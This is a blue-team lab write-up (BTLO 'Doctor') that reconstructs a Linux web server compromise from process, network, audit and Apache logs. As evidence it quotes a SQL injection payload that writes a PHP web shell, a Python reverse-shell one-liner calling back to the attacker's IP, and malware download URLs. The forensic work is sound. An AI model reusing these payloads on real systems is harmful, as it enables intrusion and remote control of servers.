---
title: Doctor
module: Incident Response
path: Investigations
platform: BTLO
tags: [linux, incident-response, web-exploitation, sql-injection, web-shell, reverse-shell, t1190, t1059, malware]
status: Completed
date: 2026-08-06
date_completed: 2026-08-07
---
*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
<p align="center">
<img src=screenshots/doctor_intro.png width="1500">
</p>
---

## Scenario

One of our web application servers has been compromised and the incident response team has isolated the machine. You've been provided with remote access; investigate the system and figure out the attacker's actions.

**Setup notes:**

- Machine is Linux, access is over remote CLI. Everything below is done in a terminal on the box.
- Escalate to root at the start with `sudo -i` so process, network, and log reads do not silently fail on permissions.
- The lab VM respawns on timeout. PIDs and hostnames change between sessions, log files do not. Save findings as you go.

---

## Investigation

### Q1. What is the name of the malicious process? Provide the full path of the binary (3 points)

When looking for malware that is installed and running, list processes in tree format so parent and child relationships are visible.

```
ps auxf
```

One branch stands out:

```
root  864  /usr/sbin/cron -f
root  870   \_ /usr/sbin/CRON -f
root  900       \_ /bin/sh -c appleaday
root  904           \_ appleaday
```

Three things give it away:

- **No absolute path.** Every legitimate service in that column is a full path, like `/usr/sbin/rsyslogd -n`. A bare word means it was launched the way a human types a command, not the way systemd provisions a service.
- **`/bin/sh -c` is cron's machinery.** Cron never execs a command directly. It forks a shell and hands it the crontab line as a string. So whatever follows `-c` is verbatim the content of a crontab entry. That is persistence.
- **The name maps to no package.** `cron`, `snapd`, `polkitd` are all real software. `appleaday` is not.

<p align="center">
<img src=screenshots/doctor-q.png width="700">
</p>

```
locate appleaday
```

The authoritative version, which reads the kernel's own record instead of trusting the command string:

```
ls -l /proc/904/exe
```

<p align="center">
<img src=screenshots/doctor-q1.png width="700">
</p>

**Answer: /usr/bin/appleaday**

---

### Q2. What is the port that the malicious process listens on? (3 points)

Find which programs (`-p`) are listening (`-l`) on TCP (`-t`) and UDP (`-u`) ports, printed numerically without resolving service names (`-n`).

```
netstat -tulnp
```

Match the PID from Q1 against the `PID/Program name` column.

Note the **Local Address** on that row is `127.0.0.1`, loopback only. This is the implant's own listener, reachable from the box itself, not from the network. That distinction matters for Q5.

<p align="center">
<img src=screenshots/doctor-q2.png width="700">
</p>

**Answer: 445**

---

### Q3. Provide the full URL from which the malware was downloaded to the system (3 points)

Search for the **downloader**, not the filename. The tool name is fixed, the filename is the attacker's choice.

```
grep -EinR 'a0="(wget|curl)"' /var/log
```

- `-E` enables extended regex so `|` means "or". Without it, `|` is a literal pipe character.
- The parentheses group the alternation so it applies inside the quotes.
- `a0` is a **field name in an auditd EXECVE record**, not a grep flag. auditd numbers command-line arguments `a0`, `a1`, `a2` and so on. `a0` is always the program itself, so filtering on it excludes my own `grep` commands automatically.

The hit is in `/var/log/audit/audit.log.3`.

<p align="center">
<img src=screenshots/doctor-q3.png width="700">
</p>

**Answer: http://18.132.210.238:6565/appleaday**

---

### Q4. There was another file downloaded from the same server. Provide the full URL (3 points)

Immediately after the first download, same server, different port:

```
a1="http://18.132.210.238:4646/LinEnum.sh"
```

The two `wget` calls are `1666283292.643` and `1666283292.647`. **Four milliseconds apart.** No human types that fast, so both came from a single chained command string, not an interactive shell.

LinEnum.sh is a Linux privilege escalation enumeration script, so this is post-exploitation recon.

<p align="center">
<img src=screenshots/doctor-q4.png width="700">
</p>

**Answer: http://18.132.210.238:4646/LinEnum.sh**

---

### Q5. What is the port running on the system that was used as the entry point, and what was the type of vulnerability exploited? (3 points)

```
netstat -tulnvp
```

**LISTEN does not mean reachable.** The column that decides that is Local Address:

- `127.0.0.1` or `::1` is loopback. Nothing outside the box can reach it.
- `0.0.0.0` or `:::` is all interfaces, so it is a candidate.

That eliminates mysqld on 3306, Xtigervnc on 5901 and 5902, and appleaday on 445. Three candidates remain:

<p align="center">
<img src=screenshots/q5ports.png width="700">
</p>

- **Port 22:** sshd, PID 1036. Stock service.
- **Port 443:** python3, PID 3480. `ps -fp 3480` shows it is `websockify` proxying to `localhost:5901`. This is noVNC, the lab's own browser-based remote access. Ruled out.
- **Port 80:** apache2, PID 1127. `ps -fp 1127` shows the stock `/usr/sbin/apache2 -k start`.

Also confirmed no firewall is filtering any of it:

```
ufw status
```

Returns `Status: inactive`.

The scenario says web application server, so apache is the target. From Q3 and Q4 the attacker IP is already known: **18.132.210.238**. Do not assume the log path, find the file with the evidence:

```
grep -FcR "18.132.210.238" /var/log/apache2
```

- `-F` treats the pattern as a literal string. Without it, each `.` in the IP is a regex wildcard.
- `-c` counts **matching lines**. Each line in an apache access log is one HTTP request.

Every file returns 0 except `access.log.1`, which returns **101930**. That number is evidence by itself. A person browsing makes 30 to 100 requests. 101,930 is automated tooling.

<p align="center">
<img src=screenshots/q5apachelog.png width="700">
</p>

101,930 lines is unreadable, so pull just the attacker's requests into a working copy:

```
grep -F "18.132.210.238" /var/log/apache2/access.log.1 > attacker-requests.log

less attacker-requests.log
```

In `less`: `g` jumps to the top, `G` to the bottom, `/pattern` searches forward, `n` for the next hit.

At the top, nmap NSE probes. To find where the exploitation starts, `g` then `/sqlmap`. First hit is 17:49:22:

```
18.132.210.238 - - [18/Mar/2021:17:49:22 +0000] "GET /prod/old/searcher.php?user=root HTTP/1.1" 200 522 "-" "sqlmap/1.2.4#stable (http://sqlmap.org)"
```

**The user-agent field is a phase marker.** The whole attack timeline reads out of that one column:

| User-agent | Phase |
|---|---|
| `Nmap Scripting Engine` | automated port and path scanning |
| `MSIE 6.0; Windows NT 5.1` | directory brute-forcing, a scanner default |
| `X11; Ubuntu; Firefox/86.0` | a human manually exploring |
| `sqlmap/1.2.4#stable` | automated SQL injection |

<p align="center">
<img src=screenshots/doctor-q5.png width="700">
</p>

**Deriving the port.** No log line contains a port number, so chain it explicitly:

- `/var/log/apache2/access.log.1` is apache's access log, per its `CustomLog` directive
- `netstat` showed apache2 bound to `:::80`
- 443 was noVNC, not apache

**Answer: 80, SQL injection**

---

### Q6. What is the name of the file that had the vulnerability? Provide the full system path (3 points)

The vulnerable file is named in the request URI of every sqlmap request: `/prod/old/searcher.php`.

**sqlmap was never downloaded to this server.** It runs on the attacker's own machine and sends requests in. `"sqlmap/1.2.4#stable"` is just the User-Agent header, the client identifying itself. An apache access log only ever records inbound requests.

The 90 seconds before sqlmap show how the file was found, in a real browser:

```
17:48:07  /prod/old/            200 749   referer "http://18.134.12.182/prod/old/"
17:48:07  /icons/blank.gif      200 431
17:48:07  /icons/back.gif       200 500
17:48:11  /prod/old/searcher.php  200 558  referer "http://18.134.12.182/prod/old/"
17:48:23  /prod/old/searcher.php?user       200 501  referer "-"
17:48:36  /prod/old/searcher.php?user=root  200 501  referer "-"
```

Two things to read here:

- `/icons/blank.gif` and `/icons/back.gif` are **Apache's directory listing images**, served by `mod_autoindex`. Their presence proves directory browsing was enabled on `/prod/old/`, which handed the attacker a clickable file listing.
- The **referer flips to `"-"`** at 17:48:23. No referer means the URL was typed into the address bar rather than followed from a link. That is the moment a visitor becomes an attacker.

<p align="center">
<img src=screenshots/doctor-searcher.png width="700">
</p>

Turn the URI into a system path. Either read the docroot out of `/etc/apache2/sites-enabled/` and append the URI, or:

```
locate searcher.php
```

<p align="center">
<img src=screenshots/doctor-q6.png width="700">
</p>

**Answer: /var/www/html/prod/old/searcher.php**

---

### Q7. What is the name of the file created and what is the first command executed by the attacker? (3 points)

Still in `access.log.1`, search for `cmd=`. The first hit is `whoami`. The lines above it are the more important part.

**The rehearsal.** Before writing anything malicious, the attacker counted columns using a harmless file:

```
17:50:47  union select "test",2      into outfile .../test.txt   200 501
17:50:49  GET /prod/old/test.txt                                 404
17:50:58  union select "test",2,3    into outfile .../test.txt   200 501
17:51:00  GET /prod/old/test.txt                                 404
17:51:08  union select "test",2,3,4  into outfile .../test.txt   200 501
17:51:12  GET /prod/old/test.txt                                 200 293
```

Two columns failed, three failed, four worked. UNION requires both queries return the same number of columns, so `,2,3,4` is padding.

**Every injection request returns `200 501`, the normal page, whether it worked or not.** The injection tells you nothing about its own success. That is why a `GET` for the file follows every attempt.

**The payload.** Once four columns was confirmed, the harmless `"test"` was swapped for PHP. URL-decoded:

```
searcher.php?user=root' union select "<?php echo system($_REQUEST['cmd']); ?>",2,3,4
into outfile '/var/www/html/prod/old/cc.php
```

- `root'` closes the original string literal, breaking out of the app's query
- `union select` bolts a second result set onto the first
- `<?php echo system($_REQUEST['cmd']); ?>` is a one-line PHP web shell that runs whatever arrives in a `cmd` parameter
- `into outfile` is a **MySQL** feature that dumps a result set to a file on disk

MySQL wrote that file, not PHP. The database had FILE privilege and write access to the web root, which is the underlying misconfiguration.

**Confirmation, then execution:**

```
17:51:58  ...into outfile .../cc.php   200 501   write it
17:52:05  GET /prod/old/cc.php         200 0     does it exist? yes, 0 bytes, no cmd given
17:52:14  GET /prod/old/cc.php?cmd=whoami  200 228   does it execute? yes
```

<p align="center">
<img src=screenshots/doctor-q7.png width="700">
</p>

**Answer: cc.php, whoami**

---

### Q8. The attacker obtained a reverse shell, what was the language used to create the reverse shell and what is the lowest port used? (4 points)

Every reverse shell attempt runs through the same web shell, as a `cmd=` parameter. URL-decoded:

```
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("18.132.210.238",443));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty;pty.spawn("/bin/bash")'
```

**Read the IP carefully.** In the raw log it appears as `s.connect((%2218.132.210.238%22,443))`. `%22` is the URL encoding for a double quote, so it is `"18.132.210.238"`, not `218.132.210.238`. The leading 2 belongs to the encoding, not the address.

The question asks for the **lowest** port because there were several attempts over ninety minutes:

| Time | Method | Port |
|---|---|---|
| 17:54:17 | python | 443 |
| 17:56:40 | python | 443 |
| 18:01:48 | nc | 443 |
| 18:20:55 | python | 4444 |
| 19:12:53 | python | 4433 |
| 19:25:34 | python | 4433 |

Port 443 was chosen first because outbound HTTPS is almost never blocked by egress filtering, so the callback blends into normal traffic.

<p align="center">
<img src=screenshots/doctor-q8.png width="700">
</p>

**Answer: python, 443**

---

## IOC Summary

| Type | Indicator | Context |
|---|---|---|
| IP | 18.132.210.238 | Attacker source, malware host, and reverse shell callback |
| URL | http://18.132.210.238:6565/appleaday | Malware download |
| URL | http://18.132.210.238:4646/LinEnum.sh | Privilege escalation enumeration script |
| File | /usr/bin/appleaday | Malicious binary, mode 0100755 |
| File | /var/www/html/prod/old/cc.php | PHP web shell written via SQL injection |
| File | /var/www/html/prod/old/test.txt | Column-count test artifact |
| File | /var/www/html/prod/old/searcher.php | Vulnerable file, injectable `user` parameter |
| Process | appleaday | Launched from root's crontab via `/bin/sh -c` |
| Port | 445/tcp (127.0.0.1) | Implant listener, loopback only |
| Port | 80/tcp | Entry point, apache2 |
| Port | 443, 4444, 4433 | Reverse shell callback destinations |
| User-agent | sqlmap/1.2.4#stable | Automated SQL injection tooling |
| Persistence | root crontab entry | Re-executes appleaday on schedule and after reboot |

---

## Notes and open questions

- Root cause is two failures stacked: an injectable parameter in `searcher.php`, and a MySQL account with FILE privilege plus write access to the web root. Fixing only the injection leaves the second one live.
- Directory browsing enabled on `/prod/old/` is what made the vulnerable file discoverable. `mod_autoindex` should be off in production.
- The path is literally named `/prod/old/`. Old code left in a live web root.
- Not verified: whether LinEnum.sh actually ran, or whether privilege escalation succeeded. The `wget` proves download, not execution. Would need to check auditd for an execve of it.
- Not verified: what `appleaday` does. It is a compiled binary, roughly 1 GB VSZ and multi-threaded (`Sl` in `ps`), which is the fingerprint of a Go binary. Static analysis would be the next step.
- The crontab entry itself was never read directly. `crontab -l -u root` and `/var/spool/cron/crontabs/root` would confirm the schedule.
- auditd logged my own investigative commands into the same files I was searching. Copying logs to a working directory first would have kept my noise out of the results.
